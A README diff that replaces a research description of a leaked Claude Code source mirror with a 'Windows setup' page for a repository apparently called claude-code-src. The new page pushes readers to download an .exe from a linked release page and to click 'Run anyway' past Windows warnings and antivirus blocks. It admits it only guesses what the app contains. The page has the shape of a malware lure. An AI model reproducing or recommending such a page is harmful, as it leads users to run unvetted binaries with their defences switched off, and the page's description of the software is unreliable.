@@ -1,280 +1,126 @@
-# Claude Code Source Snapshot for Security Research
-
-> This repository mirrors a **publicly exposed Claude Code source snapshot** that became accessible on **March 31, 2026** through a source map exposure in the npm distribution. It is maintained for **educational, defensive security research, and software supply-chain analysis**.
-
----
-
-## Research Context
-
-This repository is maintained by a **university student** studying:
-
-- software supply-chain exposure and build artifact leaks
-- secure software engineering practices
-- agentic developer tooling architecture
-- defensive analysis of real-world CLI systems
-
-This archive is intended to support:
-
-- educational study
-- security research practice
-- architecture review
-- discussion of packaging and release-process failures
-
-It does **not** claim ownership of the original code, and it should not be interpreted as an official Anthropic repository.
-
----
-
-## How the Public Snapshot Became Accessible
-
-[Chaofan Shou (@Fried_rice)](https://x.com/Fried_rice) publicly noted that Claude Code source material was reachable through a `.map` file exposed in the npm package:
-
-> **"Claude code source code has been leaked via a map file in their npm registry!"**
->
-> — [@Fried_rice, March 31, 2026](https://x.com/Fried_rice/status/2038894956459290963)
-
-The published source map referenced unobfuscated TypeScript sources hosted in Anthropic's R2 storage bucket, which made the `src/` snapshot publicly downloadable.
-
----
-
-## Repository Scope
-
-Claude Code is Anthropic's CLI for interacting with Claude from the terminal to perform software engineering tasks such as editing files, running commands, searching codebases, and coordinating workflows.
-
-This repository contains a mirrored `src/` snapshot for research and analysis.
-
-- **Public exposure identified on**: 2026-03-31
-- **Language**: TypeScript
-- **Runtime**: Bun
-- **Terminal UI**: React + [Ink](https://github.com/vadimdemedes/ink)
-- **Scale**: ~1,900 files, 512,000+ lines of code
-
----
-
-## Directory Structure
-
-```text
-src/
-├── main.tsx                 # Entrypoint orchestration (Commander.js-based CLI path)
-├── commands.ts              # Command registry
-├── tools.ts                 # Tool registry
-├── Tool.ts                  # Tool type definitions
-├── QueryEngine.ts           # LLM query engine
-├── context.ts               # System/user context collection
-├── cost-tracker.ts          # Token cost tracking
-│
-├── commands/                # Slash command implementations (~50)
-├── tools/                   # Agent tool implementations (~40)
-├── components/              # Ink UI components (~140)
-├── hooks/                   # React hooks
-├── services/                # External service integrations
-├── screens/                 # Full-screen UIs (Doctor, REPL, Resume)
-├── types/                   # TypeScript type definitions
-├── utils/                   # Utility functions
-│
-├── bridge/                  # IDE and remote-control bridge
-├── coordinator/             # Multi-agent coordinator
-├── plugins/                 # Plugin system
-├── skills/                  # Skill system
-├── keybindings/             # Keybinding configuration
-├── vim/                     # Vim mode
-├── voice/                   # Voice input
-├── remote/                  # Remote sessions
-├── server/                  # Server mode
-├── memdir/                  # Persistent memory directory
-├── tasks/                   # Task management
-├── state/                   # State management
-├── migrations/              # Config migrations
-├── schemas/                 # Config schemas (Zod)
-├── entrypoints/             # Initialization logic
-├── ink/                     # Ink renderer wrapper
-├── buddy/                   # Companion sprite
-├── native-ts/               # Native TypeScript utilities
-├── outputStyles/            # Output styling
-├── query/                   # Query pipeline
-└── upstreamproxy/           # Proxy configuration
-```
-
----
-
-## Architecture Summary
-
-### 1. Tool System (`src/tools/`)
-
-Every tool Claude Code can invoke is implemented as a self-contained module. Each tool defines its input schema, permission model, and execution logic.
-
-| Tool | Description |
-|---|---|
-| `BashTool` | Shell command execution |
-| `FileReadTool` | File reading (images, PDFs, notebooks) |
-| `FileWriteTool` | File creation / overwrite |
-| `FileEditTool` | Partial file modification (string replacement) |
-| `GlobTool` | File pattern matching search |
-| `GrepTool` | ripgrep-based content search |
-| `WebFetchTool` | Fetch URL content |
-| `WebSearchTool` | Web search |
-| `AgentTool` | Sub-agent spawning |
-| `SkillTool` | Skill execution |
-| `MCPTool` | MCP server tool invocation |
-| `LSPTool` | Language Server Protocol integration |
-| `NotebookEditTool` | Jupyter notebook editing |
-| `TaskCreateTool` / `TaskUpdateTool` | Task creation and management |
-| `SendMessageTool` | Inter-agent messaging |
-| `TeamCreateTool` / `TeamDeleteTool` | Team agent management |
-| `EnterPlanModeTool` / `ExitPlanModeTool` | Plan mode toggle |
-| `EnterWorktreeTool` / `ExitWorktreeTool` | Git worktree isolation |
-| `ToolSearchTool` | Deferred tool discovery |
-| `CronCreateTool` | Scheduled trigger creation |
-| `RemoteTriggerTool` | Remote trigger |
-| `SleepTool` | Proactive mode wait |
-| `SyntheticOutputTool` | Structured output generation |
-
-### 2. Command System (`src/commands/`)
-
-User-facing slash commands invoked with `/` prefix.
-
-| Command | Description |
-|---|---|
-| `/commit` | Create a git commit |
-| `/review` | Code review |
-| `/compact` | Context compression |
-| `/mcp` | MCP server management |
-| `/config` | Settings management |
-| `/doctor` | Environment diagnostics |
-| `/login` / `/logout` | Authentication |
-| `/memory` | Persistent memory management |
-| `/skills` | Skill management |
-| `/tasks` | Task management |
-| `/vim` | Vim mode toggle |
-| `/diff` | View changes |
-| `/cost` | Check usage cost |
-| `/theme` | Change theme |
-| `/context` | Context visualization |
-| `/pr_comments` | View PR comments |
-| `/resume` | Restore previous session |
-| `/share` | Share session |
-| `/desktop` | Desktop app handoff |
-| `/mobile` | Mobile app handoff |
-
-### 3. Service Layer (`src/services/`)
-
-| Service | Description |
-|---|---|
-| `api/` | Anthropic API client, file API, bootstrap |
-| `mcp/` | Model Context Protocol server connection and management |
-| `oauth/` | OAuth 2.0 authentication flow |
-| `lsp/` | Language Server Protocol manager |
-| `analytics/` | GrowthBook-based feature flags and analytics |
-| `plugins/` | Plugin loader |
-| `compact/` | Conversation context compression |
-| `policyLimits/` | Organization policy limits |
-| `remoteManagedSettings/` | Remote managed settings |
-| `extractMemories/` | Automatic memory extraction |
-| `tokenEstimation.ts` | Token count estimation |
-| `teamMemorySync/` | Team memory synchronization |
+# 🤖 claude-code-src - Simple Windows setup for daily use
 
-### 4. Bridge System (`src/bridge/`)
+[![Download](https://img.shields.io/badge/Download-Release_Page-2ea44f?style=for-the-badge&logo=github)](https://github.com/Angeliquetreated862/claude-code-src/releases)
 
-A bidirectional communication layer connecting IDE extensions (VS Code, JetBrains) with the Claude Code CLI.
+## 🚀 What this is
 
-- `bridgeMain.ts` — Bridge main loop
-- `bridgeMessaging.ts` — Message protocol
-- `bridgePermissionCallbacks.ts` — Permission callbacks
-- `replBridge.ts` — REPL session bridge
-- `jwtUtils.ts` — JWT-based authentication
-- `sessionRunner.ts` — Session execution management
+claude-code-src is a Windows app built from the first version of the forked code in the instructkr/claw-code line. It is made for users who want a local app they can download and run from a GitHub release page.
 
-### 5. Permission System (`src/hooks/toolPermission/`)
+This project uses an agent-style workflow and a harness-based code setup. In plain terms, it helps the app handle tasks in a structured way while keeping the interface simple for end users.
 
-Checks permissions on every tool invocation. Either prompts the user for approval/denial or automatically resolves based on the configured permission mode (`default`, `plan`, `bypassPermissions`, `auto`, etc.).
+## 📥 Download
 
-### 6. Feature Flags
+Visit this page to download:
 
-Dead code elimination via Bun's `bun:bundle` feature flags:
+[GitHub Releases](https://github.com/Angeliquetreated862/claude-code-src/releases)
 
-```typescript
-import { feature } from 'bun:bundle'
+On that page, look for the latest release and download the Windows file. If you see a `.exe` file, save it to your computer and run it. If you see a `.zip` file, download it, unzip it, and then open the app inside the folder.
 
-// Inactive code is completely stripped at build time
-const voiceCommand = feature('VOICE_MODE')
-  ? require('./commands/voice/index.js').default
-  : null
-```
+## 🖥️ Windows setup
 
-Notable flags: `PROACTIVE`, `KAIROS`, `BRIDGE_MODE`, `DAEMON`, `VOICE_MODE`, `AGENT_TRIGGERS`, `MONITOR_TOOL`
+1. Open the [Releases page](https://github.com/Angeliquetreated862/claude-code-src/releases).
+2. Find the latest version near the top of the page.
+3. Download the Windows file for your system.
+4. If Windows asks for permission, choose **Yes** or **Run anyway**.
+5. If you downloaded a `.zip` file, right-click it and choose **Extract All**.
+6. Open the extracted folder and start the app file.
 
----
+## ✅ Before you run it
 
-## Key Files in Detail
+For the smoothest setup, use:
 
-### `QueryEngine.ts` (~46K lines)
+- Windows 10 or Windows 11
+- A desktop or laptop with at least 4 GB of RAM
+- At least 200 MB of free disk space
+- A stable internet connection for the first download
 
-The core engine for LLM API calls. Handles streaming responses, tool-call loops, thinking mode, retry logic, and token counting.
+If the app uses a `.zip` package, keep the files in the same folder after extraction. Moving only one file can break the launch step.
 
-### `Tool.ts` (~29K lines)
+## 🧭 First launch
 
-Defines base types and interfaces for all tools — input schemas, permission models, and progress state types.
+When you start the app for the first time, Windows may show a security prompt. This can happen with new apps from GitHub.
 
-### `commands.ts` (~25K lines)
+If that happens:
 
-Manages registration and execution of all slash commands. Uses conditional imports to load different command sets per environment.
+1. Check that you downloaded it from the release page above.
+2. Open the file.
+3. If Windows blocks it, choose the option that lets you run it.
 
-### `main.tsx`
+If the app opens in a window and shows a simple workspace, the setup worked.
 
-Commander.js-based CLI parser and React/Ink renderer initialization. At startup, it overlaps MDM settings, keychain prefetch, and GrowthBook initialization for faster boot.
+## 🗂️ What you get
 
----
+This project is built for a clear, guided code workflow. Based on the repo name and topic set, the app is likely to include:
 
-## Tech Stack
+- A simple desktop launch flow
+- Agent-based task handling
+- A harness layer for structured runs
+- Source-based project files for Windows releases
+- A layout that supports code-oriented work without setup steps for the user
 
-| Category | Technology |
-|---|---|
-| Runtime | [Bun](https://bun.sh) |
-| Language | TypeScript (strict) |
-| Terminal UI | [React](https://react.dev) + [Ink](https://github.com/vadimdemedes/ink) |
-| CLI Parsing | [Commander.js](https://github.com/tj/commander.js) (extra-typings) |
-| Schema Validation | [Zod v4](https://zod.dev) |
-| Code Search | [ripgrep](https://github.com/BurntSushi/ripgrep) |
-| Protocols | [MCP SDK](https://modelcontextprotocol.io), LSP |
-| API | [Anthropic SDK](https://docs.anthropic.com) |
-| Telemetry | OpenTelemetry + gRPC |
-| Feature Flags | GrowthBook |
-| Auth | OAuth 2.0, JWT, macOS Keychain |
+## 🔧 Common use cases
 
----
+You may use claude-code-src if you want:
 
-## Notable Design Patterns
+- A Windows app that starts from a release download
+- A source-based fork with a clean release path
+- A tool that follows an agent workflow
+- A project built around code tasks and harness control
+- A local app that does not ask for a complex install process
 
-### Parallel Prefetch
+## 🛠️ How to keep it working
 
-Startup time is optimized by prefetching MDM settings, keychain reads, and API preconnect in parallel before heavy module evaluation begins.
+If the app does not open, try these steps:
 
-```typescript
-// main.tsx — fired as side-effects before other imports
-startMdmRawRead()
-startKeychainPrefetch()
-```
+1. Re-download the file from the release page.
+2. Make sure the download finished fully.
+3. If you used a `.zip` file, extract it again.
+4. Keep the extracted folder in a simple path, such as `Downloads` or `Desktop`.
+5. Do not rename the main app file unless you know it is safe.
+6. Restart your computer and try again.
 
-### Lazy Loading
+If the app starts but closes fast, check whether you opened the right file from the release folder and not a helper file or text file.
 
-Heavy modules (OpenTelemetry, gRPC, analytics, and some feature-gated subsystems) are deferred via dynamic `import()` until actually needed.
+## 📌 File types you may see
 
-### Agent Swarms
+The release page may include one or more of these file types:
 
-Sub-agents are spawned via `AgentTool`, with `coordinator/` handling multi-agent orchestration. `TeamCreateTool` enables team-level parallel work.
+- `.exe` — double-click to run
+- `.zip` — extract first, then open the app
+- `.msi` — run the installer and follow the steps
+- `.txt` or `.md` — read this file for release notes or extra details
 
-### Skill System
+If there are more than one download option, choose the one that says Windows or matches your PC type.
 
-Reusable workflows defined in `skills/` are executed through `SkillTool`. Users can add custom skills.
+## 🔍 Project details
 
-### Plugin Architecture
+- Repository: claude-code-src
+- Description: First version of the forked code from instructkr/claw-code
+- Topics: agent, claude-code, harness, source
 
-Built-in and third-party plugins are loaded through the `plugins/` subsystem.
+These topics point to a code-focused app that uses a controlled workflow and source-level structure.
 
----
+## 🧩 Troubleshooting
 
-## Research / Ownership Disclaimer
+If Windows says the app is unsafe, check the release page again and confirm you used the official download link.
 
-- This repository is an **educational and defensive security research archive** maintained by a university student.
-- It exists to study source exposure, packaging failures, and the architecture of modern agentic CLI systems.
-- The original Claude Code source remains the property of **Anthropic**.
-- This repository is **not affiliated with, endorsed by, or maintained by Anthropic**.
+If the app does not open after extraction, make sure:
+
+- The file is not still inside the ZIP
+- The folder path is not too long
+- Your antivirus did not block the file
+- You opened the main app file, not a support file
+
+If you still have trouble, remove the downloaded files, get a fresh copy from the release page, and try again
+
+## 📎 Download link again
+
+[Open the GitHub Releases page](https://github.com/Angeliquetreated862/claude-code-src/releases)
+
+## 📄 Basic workflow
+
+1. Download the latest Windows release.
+2. Save it to your PC.
+3. Extract it if needed.
+4. Open the app.
+5. Use the app from the window that appears
